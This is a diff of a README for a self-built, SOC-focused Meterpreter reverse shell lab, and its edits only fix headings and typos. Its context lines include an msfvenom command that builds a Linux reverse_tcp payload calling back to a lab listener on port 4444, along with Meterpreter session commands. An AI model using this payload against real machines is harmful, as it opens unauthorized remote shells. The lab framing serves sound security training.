@@ -1,4 +1,4 @@
-# meterpreter-reverse-shell-lab
+# Meterpreter-reverse-shell-lab
 SOC-focused cybersecurity lab demonstrating reverse shell execution, Metasploit usage, and incident analysis in a self built controlled environment.
 
 #  Meterpreter Reverse Shell Lab – SOC Analysis (Kali Linux)
@@ -48,7 +48,7 @@ sudo adduser victim --disabled-password --gecos ""
 
  2. Payload Generation
 
-A Linux Meterpreter reverse shell payload was generated:
+## A Linux Meterpreter reverse shell payload was generated:
 
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.121 LPORT=4444 -f elf -o shell64.elf
 chmod +x shell64.elf
@@ -85,7 +85,7 @@ netstat -antp | grep 4444
 Shows active TCP connection
 Confirms Metasploit session handling via Ruby process
 
-8 nside Meterpreter session:
+8 Inside Meterpreter session:
 getuid → confirms user identity
 sysinfo → system information
 pwd → working directory
